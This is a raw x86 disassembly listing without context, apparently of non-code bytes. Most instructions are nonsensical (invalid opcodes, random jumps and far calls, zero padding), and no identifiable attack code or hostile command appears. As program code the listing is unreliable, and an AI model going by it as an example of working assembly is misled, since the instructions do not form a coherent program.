  41534e:	jno    0x4152dd
  415350:	(bad)  
  415351:	jo     0x415353
  415353:	jns    0x415307
  415355:	inc    esp
  415356:	addr16 pop edx
  415358:	test   BYTE PTR ds:0x5b82617a,al
  41535e:	bound  eax,QWORD PTR [edi-0x54]
  415361:	add    eax,0x58a44871
  415366:	arpl   WORD PTR [ebp+0x67],dx
  415369:	jo     0x4153d2
  41536b:	push   edx
  41536c:	jl     0x415373
  41536e:	fs dec eax
  415370:	xor    DWORD PTR [ecx+0x5f],0x3a
  415374:	pop    edi
  415375:	push   0x72
  415377:	or     al,0x44
  415379:	jae    0x41537b
  41537b:	adc    eax,0x1d74563c
  415380:	inc    esp
  415381:	push   esi
  415382:	je     0x41536d
  415384:	and    eax,0x310c7644
  415389:	ins    BYTE PTR es:[edi],dx
  41538a:	popa   
  41538b:	adc    bl,BYTE PTR [edi+0x72]
  41538e:	outs   dx,BYTE PTR ds:[esi]
  41538f:	or     al,0x43
  415391:	jb     0x415409
  415393:	add    al,0x5f
  415395:	imul   ebx,DWORD PTR [edi-0x21],0xcc006939
  41539c:	or     DWORD PTR [ecx+0x6d],esi
  41539f:	fild   WORD PTR ds:0xdc16105
  4153a5:	push   edi
  4153a6:	popa   
  4153a7:	add    BYTE PTR [edx+0x726607],dl
	...
  4153b9:	add    BYTE PTR [eax],al
  4153bb:	xchg   ebx,eax
  4153bc:	push   0x6e
  4153be:	fs jp  0x415429
  4153c1:	imul   esp,DWORD PTR [edx+edi*2+0x6b],0x61
  4153c6:	jae    0x4153c6
  4153c8:	aas    
  4153c9:	outs   dx,BYTE PTR ds:[esi]
  4153ca:	jns    0x415416
  4153cc:	inc    ecx
  4153cd:	imul   ebp,DWORD PTR [esi-0x21],0x6
  4153d1:	imul   ebp,DWORD PTR [ecx-0x27],0xd5736b54
  4153d8:	push   0x14f80074
  4153dd:	xor    dh,BYTE PTR [edx]
  4153df:	call   0xafa353f8
  4153e4:	bound  ebp,QWORD PTR fs:[edi+ebp*4+0x5a]
  4153e9:	add    BYTE PTR [ecx],dh
  4153eb:	jnp    0x415405
  4153ed:	sub    eax,0x2d186b31
  4153f2:	add    BYTE PTR [ecx-0x569ea0c2],bl
  4153f8:	ds ins BYTE PTR es:[edi],dx
  4153fa:	popa   
  4153fb:	or     al,BYTE PTR [ecx+0x6b]
  4153fe:	jb     0x41539e
  415400:	push   0x6e9326e
  415405:	gs ins BYTE PTR es:[edi],dx
  415407:	jne    0x415460
  415409:	popa   
  41540a:	gs add BYTE PTR gs:[bp+0x65],ah
  415410:	ds je  0x415475
  415413:	pop    ebx
  415414:	cmp    eax,0x3aca316c
  415419:	imul   esi,DWORD PTR [esi+0x53],0x3f
  41541d:	arpl   WORD PTR [eax],ax
	...
  41542b:	add    BYTE PTR [eax],al
  41542d:	add    BYTE PTR [eax+ebp*2+0x74],ah
  415431:	push   0x65003f5b
  415436:	mov    bh,0x3d
  415438:	pop    ebp
  415439:	outs   dx,BYTE PTR ds:[esi]
  41543a:	scas   eax,DWORD PTR es:[edi]
  41543b:	gs ins BYTE PTR es:[edi],dx
  41543d:	add    BYTE PTR [ebx-0x41],ah
  415440:	ins    WORD PTR es:[edi],dx
  415442:	hlt    
  415443:	int    0x6c
  415445:	add    BYTE PTR ds:0x46966a1,al
  41544b:	retf   0x5f
  41544e:	lock int3 
  415450:	pop    eax
  415451:	imul   ebp,edx,0xffffffeb
  415454:	pop    eax
  415455:	pop    edi
  415456:	fild   DWORD PTR [ebx-0x133893a0]
  41545c:	pop    ebx
  41545d:	pop    edi
  41545e:	ror    BYTE PTR [ebx+0x63b90057],1
  415464:	pop    ecx
  415465:	outs   dx,BYTE PTR ds:[esi]
  415466:	arpl   WORD PTR [ebp-0x6053cd8c],bx
  41546c:	pusha  
  41546d:	xor    al,0xb1
  41546f:	in     al,dx
  415470:	arpl   WORD PTR [edi-0x3f],bx
  415473:	push   ebp
  415474:	add    DWORD PTR [edx-0x7a],esi
  415477:	push   eax
  415478:	xor    esi,DWORD PTR [edx]
  41547a:	push   eax
  41547b:	in     al,dx
  41547c:	arpl   WORD PTR [edx+eax*4+0x4e],bp
  415480:	pop    eax
  415481:	pop    edi
  415482:	arpl   WORD PTR [esi+esi*2],di
  415485:	lea    ecx,[bx+0x5f]
  415489:	add    BYTE PTR [edx+0x1b],dh
  41548c:	pop    edi
  41548d:	jb     0x415506
  41548f:	in     al,dx
  415490:	pushw  0x0
	...
  4154a0:	add    BYTE PTR [esi+0x20],bh
  4154a3:	jne    0x415508
  4154a5:	inc    edx
  4154a6:	in     al,dx
  4154a7:	xor    BYTE PTR [ebx],dh
  4154a9:	mov    ?,WORD PTR [ecx+0xa420030]
  4154af:	popa   
  4154b0:	arpl   WORD PTR [edi],si
  4154b2:	mov    ebp,0xde426801
  4154b7:	pop    ebp
  4154b8:	popa   
  4154b9:	inc    esp
  4154ba:	fisub  WORD PTR [eax+0x0]
  4154bd:	inc    edi
  4154be:	adc    DWORD PTR [esp+esi*2+0x3e],ebp
  4154c2:	fiadd  WORD PTR [ecx]
  4154c4:	jno    0x4154c8
  4154c6:	add    eax,0x4ff60dd
  4154cb:	sbb    BYTE PTR ds:0x371a1751,dh
  4154d1:	arpl   WORD PTR [ebp-0x38],bp
  4154d4:	push   edi
  4154d5:	psrad  mm7,0x5d
  4154d9:	adc    al,0x56
  4154db:	mov    bh,0x60
  4154dd:	icebp  
  4154de:	add    al,0xcb
  4154e0:	fs cmc 
  4154e2:	imul   eax,esp,0x57
  4154e5:	iret   
  4154e6:	push   0xffffffe7
  4154e8:	pop    esi
  4154e9:	mov    esp,0xbd609359
  4154ee:	add    eax,0x54d2648a
  4154f3:	and    BYTE PTR [eax+0x63],0x54
  4154f7:	jnp    0x415559
  4154f9:	(bad)  
  4154fa:	jno    0x415484
  4154fc:	add    esi,DWORD PTR [ebx-0x3f9377ad]
  415502:	push   ebx
  415503:	out    0x5b,eax
	...
  415511:	add    BYTE PTR [eax],al
  415513:	add    BYTE PTR [esi+0x7e594b59],cl
  415519:	add    eax,0x697d5b56
  41551e:	inc    esi
  41551f:	jno    0x4154b3
  415521:	add    eax,0x59726f3c
  415526:	dec    ebx
  415527:	pop    ebx
  415528:	add    BYTE PTR ds:0x6a776346,0x3a
  41552f:	add    al,0x81
  415531:	outs   dx,BYTE PTR ds:[esi]
  415532:	cmp    ebx,DWORD PTR [eax+0x46]
  415535:	sbb    bx,WORD PTR [edi+0x52]
  415539:	add    eax,0x69415c06
  41553e:	sbb    ebx,DWORD PTR [edx+0x63]
  415541:	push   0x6c495c05
  415546:	adc    al,0x4
  415548:	test   BYTE PTR [ebx],dl
  41554a:	mov    edx,0x17702f
  41554f:	mov    esi,0xe9301878
  415554:	pusha  
  415555:	fs je  0x41553a
  415558:	push   cs
  415559:	push   edi
  41555a:	imul   ecx,esi,0xdc756f16
  415560:	pusha  
  415561:	ins    DWORD PTR es:[edi],dx
  415562:	je     0x415539
  415564:	lock sbb ch,BYTE PTR ds:0x2e304816
  41556b:	clc    
  41556c:	xor    BYTE PTR ss:[esi],ch
  41556f:	icebp  
  415570:	xor    al,0x2f
  415572:	xor    bh,cl
  415574:	mov    WORD PTR [ebx],ds
  415576:	cmp    cl,bl
	...
  415584:	add    BYTE PTR [eax],al
  415586:	add    BYTE PTR [eax-0x5466d2eb],cl
  41558c:	outs   dx,DWORD PTR ds:[esi]
  41558d:	ja     0x415555
  41558f:	ret    
  415590:	inc    eax
  415591:	je     0x415517
  415593:	pop    edx
  415594:	push   ebp
  415595:	push   0x746d6079
  41559a:	jne    0x41554c
  41559c:	sbb    ebp,DWORD PTR ds:0x2e3079c6
  4155a2:	mov    eax,0x202e3056
  4155a7:	dec    esi
  4155a8:	das    
  4155a9:	das    
  4155aa:	push   ss
  4155ab:	aas    
  4155ac:	sbb    edi,DWORD PTR [eax]
  4155ae:	sbb    DWORD PTR [edi],esi
  4155b0:	adc    eax,0x6f9a592d
  4155b5:	ja     0x4155cd
  4155b7:	add    BYTE PTR [eax+0x74],0x44
  4155bb:	dec    ecx
  4155bc:	push   ebp
  4155bd:	push   0x68055f39
  4155c2:	xor    eax,0xd63a5553
  4155c7:	jnp    0x415638
  4155c9:	ins    DWORD PTR es:[edi],dx
  4155ca:	sbb    esi,DWORD PTR [eax+eax*2]
  4155cd:	jno    0x4155da
  4155cf:	sub    DWORD PTR [ebx+0x2e],esp
  4155d2:	or     bl,BYTE PTR [edx]
  4155d4:	ins    BYTE PTR es:[edi],dx
  4155d5:	sub    eax,0x66408600
  4155da:	xor    DWORD PTR [ecx+0x33],edi
  4155dd:	js     0x415655
  4155df:	popf   
  4155e0:	ss xor al,0x61
  4155e3:	fdivr  QWORD PTR [esi]
  4155e5:	js     0x41564c
  4155e7:	mov    bh,BYTE PTR [ebx]
  4155e9:	je     0x41565f
	...
  4155f7:	add    BYTE PTR [eax],al
  4155f9:	add    BYTE PTR [edx-0x60d0d4cf],ch
  4155ff:	ds ins BYTE PTR es:[edi],dx
  415601:	outs   dx,DWORD PTR ds:[esi]
  415602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415603:	push   0x69
  415605:	jne    0x4155c0
  415607:	cmp    bl,BYTE PTR [edi+0x63]
  41560a:	sahf   
  41560b:	bound  ebp,QWORD PTR [edi+0x73]
  41560e:	pop    esp
  41560f:	push   0x6b
  415611:	ins    DWORD PTR es:[edi],dx
  415612:	pop    ebp
  415613:	and    bh,BYTE PTR [edi]
  415615:	push   esp
  415616:	cmp    BYTE PTR [eax+ebp*2],ch
  415619:	popa   
  41561a:	clc    
  41561b:	std    
  41561c:	xor    al,0x31
  41561e:	sti    
  41561f:	gs cs sar BYTE PTR gs:[edi],cl
  415624:	add    BYTE PTR [eax-0x4a],ch
  415627:	outs   dx,BYTE PTR ds:[esi]
  415628:	jo     0x415664
  41562a:	sbb    eax,0xa57772fe
  41562f:	cld    
  415630:	jb     0x415697
  415632:	out    0x3e,al
  415634:	outs   dx,BYTE PTR gs:[esi]
  415636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415637:	fs jbe 0x41569f
  41563a:	pushf  
  41563b:	push   ebp
  41563c:	gs cs cdq 
  41563f:	imul   ebp,DWORD PTR ss:[edi],0x777558a4
  415646:	dec    eax
  415647:	sbb    al,0x44
  415649:	outs   dx,DWORD PTR ds:[esi]
  41564a:	pop    ebp
  41564b:	aaa    
  41564c:	jbe    0x415696
  41564e:	inc    edx
  41564f:	cmp    BYTE PTR [ecx+0x50],dh
  415652:	fsub   QWORD PTR [ebp+0x78]
  415655:	gs retf 0x5502
  415659:	push   ebp
  41565a:	xchg   ebx,eax
  41565b:	cmp    DWORD PTR [ebx+0x44],edx
	...
  41566a:	add    BYTE PTR [eax],al
  41566c:	add    BYTE PTR [ebx+0x2e],ah
  41566f:	cmp    ecx,DWORD PTR [esi+eiz*1-0x44]
  415673:	dec    esp
  415674:	push   ebx
  415675:	sub    bh,ah
  415677:	cmp    BYTE PTR [ebp+eiz*1+0x15],al
  41567b:	cmp    BYTE PTR [ebx+0x73],al
  41567e:	cmc    
  41567f:	dec    esi
  415680:	inc    edi
  415681:	and    dl,bh
  415683:	dec    edx
  415684:	push   eax
  415685:	das    
  415686:	mov    cl,0x3d
  415688:	xor    BYTE PTR [edx],ch
  41568a:	cdq    
  41568b:	cmp    al,0x2f
  41568d:	xor    eax,0x630003fc
  415692:	in     al,dx
  415693:	add    DWORD PTR [edx],eax
  415695:	arpl   WORD PTR [ecx-0x12e9bbca],bx
  41569b:	add    al,0x0
  41569d:	arpl   sp,bp
  41569f:	add    DWORD PTR [eax],eax
  4156a1:	arpl   sp,bp
  4156a3:	add    DWORD PTR [ecx-0x5c],edx
  4156a6:	scas   al,BYTE PTR es:[edi]
  4156a7:	dec    ebp
  4156a8:	push   ebp
  4156a9:	mov    ds:0x965c409a,al
  4156ae:	test   DWORD PTR [edx+0x72],esp
  4156b1:	int3   
  4156b2:	jnp    0x41570a
  4156b4:	scas   ax,WORD PTR es:[edi]
  4156b6:	test   al,0x4e
  4156b8:	addr16 mov ebp,0xb0755688
  4156be:	js     0x415702
  4156c0:	jae    0x415653
  4156c2:	pop    edx
  4156c3:	pusha  
  4156c4:	outs   dx,BYTE PTR ds:[esi]
  4156c5:	(bad)  
  4156c6:	push   ds
  4156c7:	pop    edi
  4156c8:	jb     0x41565a
  4156ca:	xor    eax,0x21a76e55
  4156cf:	push   esi
  4156d0:	add    BYTE PTR [bx+si],al
	...
  4156df:	add    BYTE PTR [ebp-0x78a08fc5],cl
  4156e5:	cmp    BYTE PTR [ebx+edx*2],al
  4156e8:	jge    0x41571f
  4156ea:	push   esi
  4156eb:	jno    0x41575c
  4156ed:	dec    ebp
  4156ee:	pop    eax
  4156ef:	ins    BYTE PTR es:[edi],dx
  4156f0:	xor    BYTE PTR [eax],bl
  4156f2:	jb     0x41575b
  4156f4:	inc    ebp
  4156f5:	add    eax,0x6c27040e
  4156fa:	sbb    dh,BYTE PTR [edi+esi*1+0x64]
  4156fe:	adc    BYTE PTR [esi],dh
  415700:	sbb    al,0x70
  415702:	add    al,0x4
  415704:	pop    ss
  415705:	add    eax,0x56303e7
  41570a:	out    0x3,eax
  41570c:	arpl   WORD PTR ds:0x6f116102,ax
  415712:	add    al,0x58
  415714:	push   edx
  415715:	adc    edx,DWORD PTR ds:0xe770ff60
  41571b:	dec    esi
  41571c:	das    
  41571d:	xor    ch,BYTE PTR [esi-0x35bc08a0]
  415723:	outs   dx,DWORD PTR ds:[esi]
  415724:	cld    
  415725:	push   esi
  415726:	int3   
  415727:	inc    edx
  415728:	(bad)  
  415729:	outs   dx,BYTE PTR ds:[esi]
  41572a:	mov    edx,0x9a67f756
  41572f:	pusha  
  415730:	rcr    BYTE PTR [eax-0x40],cl
  415733:	push   esi
  415734:	lds    ecx,FWORD PTR [esi-0x75]
  415737:	add    esi,DWORD PTR [ebx-0x3f9d71a9]
  41573d:	pop    eax
  41573e:	call   0x52:0x7e31c73c
	...
  415751:	add    BYTE PTR [eax],al
  415753:	rcr    BYTE PTR [eax+0x7a],0x5c
  415757:	mov    esi,0x635fb06b
  41575c:	add    eax,0x56303e7
  415761:	out    0x3,eax
  415763:	arpl   WORD PTR ds:0x5594724a,ax
  415769:	push   ebx
  41576a:	xor    DWORD PTR [ecx+0x2b],edx
  41576d:	dec    ebx
  41576e:	pop    eax
  41576f:	pop    DWORD PTR ds:0x556c722a
  415775:	cmp    ecx,DWORD PTR [edi+0x7d]
  415778:	push   ebp
  415779:	cmp    DWORD PTR [ebp+0x6f],edx
  41577c:	bound  eax,QWORD PTR [eax]
  41577e:	dec    edx
  41577f:	push   ebx
  415780:	inc    ecx
  415781:	pop    edi
  415782:	xor    eax,0xe9000540
  415787:	pusha  
  415788:	add    eax,0x6837042e
  41578d:	add    BYTE PTR [edx],bh
  41578f:	push   ss
  415790:	arpl   WORD PTR [esi+edx*1+0x40],si
  415794:	push   edi
  415795:	arpl   WORD PTR ds:0x1b6e641e,sp
  41579b:	and    BYTE PTR [edi],dh
  41579d:	add    BYTE PTR [esi],al
  41579f:	pop    ss
  4157a0:	push   0x561e96e
  4157a5:	add    BYTE PTR [ecx+0x12],ch
  4157a8:	ins    DWORD PTR es:[edi],dx
  4157a9:	arpl   bp,cx
  4157ab:	sub    al,0x16
  4157ad:	xor    al,BYTE PTR [edi]
  4157af:	add    ebp,DWORD PTR [ecx+0x6c]
  4157b2:	jmp    0xcc86a4ca
	...
  4157c3:	add    BYTE PTR [eax],al
  4157c5:	add    ah,bh
  4157c7:	inc    edx
  4157c8:	ins    DWORD PTR es:[edi],dx
  4157c9:	int    0x4
  4157cb:	push   0x51c19972
  4157d0:	push   0x560a8
  4157d5:	jmp    0xd0f25d3a
  4157da:	mov    eax,ds:0xa1c0c805
  4157df:	add    eax,0x5a1c0d8
  4157e4:	out    dx,al
  4157e5:	shl    BYTE PTR [ecx-0x5e2f03fb],1
  4157eb:	add    eax,0x5a1c30c
  4157f0:	sbb    al,0xc3
  4157f2:	mov    eax,ds:0xa0132f05
  4157f7:	add    eax,0x5a01348
  4157fc:	pop    esp
  4157fd:	add    esp,DWORD PTR [eax-0x5ffc8cfb]
  415803:	add    eax,0x48500097
  415808:	add    BYTE PTR [esi+0x4850],dh
  41580e:	retf   0x7
  415811:	add    edx,ecx
  415813:	pop    es
  415814:	add    BYTE PTR ds:0x4d0007ba,0x83
  41581b:	and    DWORD PTR [edi+ebp*2+0x69],eax
  41581f:	ins    BYTE PTR es:[edi],dx
  415820:	imul   esp,DWORD PTR [ebp-0x4c],0xbb006f6b
  415827:	pop    es
  415828:	add    BYTE PTR [eax+0x0],al
	...
  415836:	add    BYTE PTR [eax],al
  415838:	add    al,al
  41583a:	pop    es
  41583b:	add    BYTE PTR [eax],al
  41583d:	dec    ebx
  41583e:	push   ecx
  41583f:	jo     0x415885
  415841:	imul   edx,DWORD PTR [ebp+0x5d],0x0
  415845:	jnp    0x41584e
  415847:	add    BYTE PTR [eax+0x786],al
  41584d:	(bad)  
  41584e:	xor    BYTE PTR [edi+0x61],bl
  415851:	mov    dh,0x27
  415853:	cmp    eax,0x5d1baa70
  415858:	je     0x4157f5
  41585a:	pop    es
  41585b:	std    
  41585c:	dec    DWORD PTR [edx-0x79]
  41585f:	and    BYTE PTR [eax],al
  415861:	dec    edx
  415862:	pop    es
  415863:	aas    
  415864:	popa   
  415865:	fnstcw WORD PTR [esi]
  415867:	popa   
  415868:	add    BYTE PTR [ebx],bh
  41586a:	pop    es
  41586b:	add    BYTE PTR [eax+0x72b],al
  415871:	or     DWORD PTR [edx],esi
  415873:	imul   ebp,DWORD PTR [ebx-0x2d],0x3b
  415877:	outs   dx,DWORD PTR ds:[esi]
  415878:	add    BYTE PTR [ebx],bh
  41587a:	pop    es
  41587b:	add    BYTE PTR [eax+0x728],al
  415881:	ret    0x6f3f
  415884:	je     0x41583b
  415886:	xor    esi,DWORD PTR [ebp+0x0]
  415889:	clc    
  41588a:	push   es
  41588b:	add    BYTE PTR [eax+0x1e963],al
  415891:	arpl   cx,di
  415893:	pop    edx
  415894:	and    BYTE PTR [edi+0x76736533],ah
  41589a:	inc    ecx
  41589b:	jb     0x415911
	...
  4158a9:	add    BYTE PTR [eax],al
  4158ab:	add    BYTE PTR [eax-0x14],dl
  4158ae:	add    eax,DWORD PTR [eax]
  4158b0:	arpl   WORD PTR [ebp+eiz*1+0x0],bp
  4158b4:	arpl   sp,bp
  4158b6:	inc    esi
  4158b7:	ins    DWORD PTR es:[edi],dx
  4158b8:	or     DWORD PTR ss:[ecx+0x6e],esi
  4158bc:	sub    DWORD PTR ds:0xd1f7054,0x58
  4158c3:	pop    edi
  4158c4:	arpl   bp,bp
  4158c6:	add    DWORD PTR [eax],eax
  4158c8:	jecxz  0x41588d
  4158ca:	add    DWORD PTR [eax],eax
  4158cc:	arpl   WORD PTR [ecx],sp
  4158ce:	pop    ebx
  4158cf:	and    BYTE PTR [ebx],dh
  4158d1:	add    eax,0xbe167465
  4158d6:	push   0x1ee6371
  4158db:	add    bl,ah
  4158dd:	add    al,BYTE PTR [eax+eax*1]
  4158e0:	arpl   WORD PTR [edi-0x4d01948e],bp
  4158e6:	outs   dx,DWORD PTR ds:[esi]
  4158e7:	and    BYTE PTR [edi],bl
  4158e9:	retf   
  4158ea:	data16 jae 0x4158bb
  4158ed:	leave  
  4158ee:	outs   dx,DWORD PTR ds:[esi]
  4158ef:	je     0x4158c1
  4158f1:	in     al,dx
  4158f2:	add    eax,DWORD PTR [eax]
  4158f4:	arpl   WORD PTR [ecx+esi*1+0x0],bp
  4158f8:	arpl   sp,bp
  4158fa:	inc    esi
  4158fb:	ins    DWORD PTR es:[edi],dx
  4158fc:	into   
  4158fd:	xor    DWORD PTR [edx+0x6e],0x6b65ad83
  415904:	mov    edx,0xaf716c72
  415909:	pop    esi
  41590a:	fs je  0x415897
  41590d:	pop    edx
  41590e:	push   0x20
	...
  41591f:	scas   eax,DWORD PTR es:[edi]
  415920:	pop    ebx
  415921:	jb     0x41598f
  415923:	nop
  415924:	add    eax,0x56304e7
  415929:	adc    esp,DWORD PTR [bp+di+0x5]
  41592d:	out    0x44,eax
  41592f:	jg     0x415999
  415931:	inc    eax
  415932:	jb     0x4158b8
  415934:	push   esi
  415935:	cmp    edx,DWORD PTR [esi-0x7c]
  415938:	push   ecx
  415939:	push   eax
  41593a:	pop    edx
  41593b:	inc    eax
  41593c:	and    eax,0x6946731b
  415941:	cmp    al,BYTE PTR [esp+ecx*8]
  415944:	(bad)  
  415946:	and    DWORD PTR [eax+0x5],0xffffffe7
  41594a:	add    edx,DWORD PTR [ebx]
  41594c:	pusha  
  41594d:	sbb    DWORD PTR [edi+0x46],edx
  415950:	imul   ecx,DWORD PTR [eax],0x70
  415953:	arpl   WORD PTR [esi],si
  415955:	push   ss
  415956:	push   0x2f
  415958:	push   edx
  415959:	or     BYTE PTR [esi+0x0],dl
  41595c:	cmp    DWORD PTR [ebp*2+0x56fe5702],esp
  415963:	(bad)  
  415964:	(bad)  
  415965:	fstp   TBYTE PTR [edi]
  415967:	cs ins BYTE PTR es:[edi],dx
  415969:	int    0x67
  41596b:	push   cs
  41596c:	push   edx
  41596d:	fidivr DWORD PTR [edi]
  41596f:	and    dl,BYTE PTR [eax-0x27]
  415972:	push   ebp
  415973:	add    BYTE PTR [ebx-0x45],ch
  415976:	cmp    DWORD PTR [eax],eax
  415978:	push   edi
  415979:	mov    edx,0x9367ce6c
  41597e:	dec    eax
  41597f:	fist   DWORD PTR [ebp-0x45]
  415982:	jb     0x415984
	...
  415990:	add    BYTE PTR [eax],al
  415992:	shl    DWORD PTR [edx-0x67],1
  415995:	aas    
  415996:	mov    dl,0x6d
  415998:	test   BYTE PTR [edi-0x31],ch
  41599b:	and    eax,0x61c772ad
  4159a0:	test   BYTE PTR [ebp-0x4e],dl
  4159a3:	add    eax,0x31925297
  4159a8:	(bad)  
  4159a9:	sub    BYTE PTR [edx+0x4ca10025],dl
  4159af:	xor    DWORD PTR [eax-0x42],edx
  4159b2:	ja     0x4159db
  4159b4:	xor    ah,dh
  4159b6:	push   esi
  4159b7:	dec    ebp
  4159b8:	ins    DWORD PTR es:[edi],dx
  4159b9:	pop    edx
  4159ba:	fwait
  4159bb:	sbb    esp,DWORD PTR [eax]
  4159bd:	or     al,0x8e
  4159bf:	or     al,0xa
  4159c1:	sub    BYTE PTR [esi-0x74c69c9a],al
  4159c7:	sbb    esp,DWORD PTR [eax]
  4159c9:	adc    edx,DWORD PTR [edx+0x21e30b2b]
  4159cf:	popaw  
  4159d1:	inc    esp
  4159d2:	aaa    
  4159d3:	push   ecx
  4159d4:	sub    ebp,DWORD PTR [ecx+edx*2]
  4159d7:	ins    WORD PTR es:[edi],dx
  4159d9:	add    eax,0xd3656748
  4159de:	and    BYTE PTR [eax+0x64],0x4
  4159e2:	xor    DWORD PTR [ecx+0x67],edx
  4159e5:	std    
  4159e6:	or     DWORD PTR [ecx],ebp
  4159e8:	and    bl,dl
  4159ea:	jg     0x415a54
  4159ec:	cmp    edi,DWORD PTR [ecx-0x1bef49b]
  4159f2:	adc    dl,BYTE PTR [ecx+0x63]
  4159f5:	xlat   BYTE PTR ds:[ebx]
	...
  415a02:	add    BYTE PTR [eax],al
  415a04:	add    BYTE PTR [esp+ebp*1],ch
  415a07:	dec    esp
  415a08:	(bad)  
  415a09:	repnz popa 
  415a0b:	je     0x4159ce
  415a0d:	push   esi
  415a0e:	and    eax,0xc15bd23
  415a13:	or     ch,BYTE PTR [edx-0x3b91990d]
  415a19:	(bad)  
  415a1a:	push   ecx
  415a1b:	addr16 (bad) 
  415a1d:	rcr    BYTE PTR [ebx],cl
  415a1f:	and    dl,cl
  415a21:	mov    esp,0x558c716a
  415a26:	or     eax,DWORD PTR [ecx-0x72]
  415a29:	mov    dl,0x51
  415a2b:	arpl   WORD PTR [edi-0x6fabd374],ax
  415a31:	nop
  415a32:	cmp    al,BYTE PTR fs:[eax]
  415a35:	sbb    ah,BYTE PTR [ebx+0x70]
  415a38:	jo     0x415a28
  415a3a:	push   0x5f
  415a3c:	popa   
  415a3d:	xchg   esi,eax
  415a3e:	imul   ebp,DWORD PTR [ebx+0x6e],0xffffffcd
  415a42:	push   esp
  415a43:	pop    edi
  415a44:	je     0x4159dd
  415a46:	cmp    eax,0x2f967329
  415a4b:	popa   
  415a4c:	popa   
  415a4d:	lahf   
  415a4e:	or     BYTE PTR [edx],cl
  415a50:	inc    ebx
  415a51:	sub    eax,0x8c657453
  415a56:	cmp    eax,0x622c4529
  415a5b:	imul   esp,DWORD PTR [ebx+eiz*1+0x53],0x63
  415a60:	cmp    bl,BYTE PTR [edx+0x5f]
  415a63:	outs   dx,BYTE PTR gs:[esi]
  415a65:	pop    ebx
  415a66:	das    
  415a67:	jne    0x415a76
	...
  415a75:	add    BYTE PTR [eax],al
  415a77:	add    BYTE PTR [eax+0x58656f0e],dh
  415a7d:	sub    BYTE PTR ds:0x74536767,bh
  415a83:	cmp    bl,BYTE PTR [edx+0x737a6b46]
  415a89:	push   ebp
  415a8a:	ins    BYTE PTR es:[edi],dx
  415a8b:	popa   
  415a8c:	popf   
  415a8d:	out    dx,eax
  415a8e:	sub    eax,0x5f2b9a30
  415a93:	outs   dx,DWORD PTR ds:[esi]
  415a94:	scas   eax,DWORD PTR es:[edi]
  415a95:	xor    ebx,DWORD PTR [ebp+0x74]
  415a98:	xchg   ebx,eax
  415a99:	popa   
  415a9a:	ins    BYTE PTR es:[edi],dx
  415a9b:	gs push ecx
  415a9d:	and    DWORD PTR [ecx+0x53],ecx
  415aa0:	ret    
  415aa1:	and    BYTE PTR ds:0x2036f14c,dh
  415aa8:	cmc    
  415aa9:	imul   ebp,DWORD PTR [esi+0x64],0x1d
  415aad:	outs   dx,DWORD PTR ds:[esi]
  415aaf:	and    BYTE PTR [ebx-0x5],dl
  415ab2:	and    al,0xd
  415ab4:	push   eax
  415ab5:	or     BYTE PTR [edx],cl
  415ab7:	add    BYTE PTR [ecx],cl
  415ab9:	push   esi
  415aba:	outs   dx,BYTE PTR ds:[esi]
  415abb:	je     0x415b20
  415abd:	mov    DWORD PTR [edi+0x74],ebp
  415ac0:	jle    0x415b3a
  415ac2:	data16 outs dx,BYTE PTR ds:[esi]
  415ac4:	mov    esp,0x633a6958
  415ac9:	test   al,0x70
  415acb:	popa   
  415acc:	sbb    BYTE PTR [eax+0x6a],0x6d
  415ad0:	jge    0x415a64
  415ad2:	add    DWORD PTR [ebp-0x62],eax
  415ad5:	sbb    BYTE PTR [ebx+eiz*1],ah
  415ad8:	jo     0x415ae6
  415ada:	dec    esp
  415adb:	push   esp
	...
  415ae8:	add    BYTE PTR [eax],al
  415aea:	add    BYTE PTR [edi+0x3d2f2d1c],cl
  415af0:	cld    
  415af1:	push   cs
  415af2:	or     bl,BYTE PTR [ebx-0x668baed1]
  415af8:	or     al,0x27
  415afa:	jno    0x415b62
  415afc:	loop   0x415b42
  415afe:	popa   
  415aff:	inc    eax
  415b00:	inc    ecx
  415b01:	push   esp
  415b02:	je     0x415a8d
  415b04:	int3   
  415b05:	daa    
  415b06:	sub    eax,0x3f07e989
  415b0b:	inc    eax
  415b0c:	or     esp,DWORD PTR [edi+0x70]
  415b0f:	aaa    
  415b10:	cdq    
  415b11:	dec    eax
  415b12:	outs   dx,BYTE PTR ds:[esi]
  415b13:	inc    eax
  415b14:	out    dx,eax
  415b15:	addr16 addr16 or eax,0xa2019ff
  415b1c:	or     BYTE PTR [edi+0x6e],ah
  415b1f:	pop    ss
  415b20:	add    eax,0xc377758
  415b25:	sub    bh,BYTE PTR [ecx]
  415b27:	repnz clc 
  415b29:	adc    ecx,DWORD PTR [ebx]
  415b2b:	imul   ebp,DWORD PTR [ebx-0x3f029192],0xaefa7462
  415b35:	imul   edi,DWORD PTR [edx],0xffffff83
  415b38:	retf   
  415b39:	ins    DWORD PTR es:[edi],dx
  415b3a:	ins    DWORD PTR es:[edi],dx
  415b3b:	ror    cl,1
  415b3d:	adc    BYTE PTR [edx],cl
  415b3f:	mov    dh,0x9b
  415b41:	push   0xa8057672
  415b46:	data16 shl BYTE PTR [edi-0x6d],0x19
  415b4b:	or     DWORD PTR [eax-0x7a],0x59
	...
  415b5b:	add    BYTE PTR [eax],al
  415b5d:	add    ah,al
  415b5f:	imul   edi,DWORD PTR [ebx+0x64],0x13d51176
  415b66:	inc    ebx
  415b67:	sub    eax,0x55886e8a
  415b6c:	mov    BYTE PTR [edi-0x7c],dl
  415b6f:	arpl   WORD PTR [ebx+0x68],di
  415b72:	dec    edx
  415b73:	and    eax,0x40a43334
  415b78:	pop    es
  415b79:	sbb    DWORD PTR [ebp+0x15],eax
  415b7c:	adc    ah,BYTE PTR [esi+edx*4]
  415b7f:	ins    BYTE PTR es:[edi],dx
  415b80:	cmp    eax,0x3a4e7668
  415b85:	and    al,0x94
  415b87:	sbb    eax,0x8691110
  415b8c:	loope  0x415b91
  415b8e:	jge    0x415b95
  415b90:	std    
  415b91:	sub    eax,0x2dd13963
  415b96:	mov    DWORD PTR ds:0x5892dd1,eax
  415b9c:	add    eax,0x17643769
  415ba1:	ins    DWORD PTR es:[edi],dx
  415ba2:	jb     0x415bb7
  415ba4:	aad    0x67
  415ba6:	punpckhwd mm4,mm7
  415ba9:	dec    ebp
  415baa:	add    BYTE PTR [ecx+0x28],dl
  415bad:	push   esp
  415bae:	add    al,0x43
  415bb0:	hlt    
  415bb1:	gs std 
  415bb3:	pop    edi
  415bb4:	fld    DWORD PTR [ebp-0xf]
  415bb7:	pop    edi
  415bb8:	les    eax,FWORD PTR [ebx]
  415bba:	and    eax,0xf238db60
  415bbf:	pop    edi
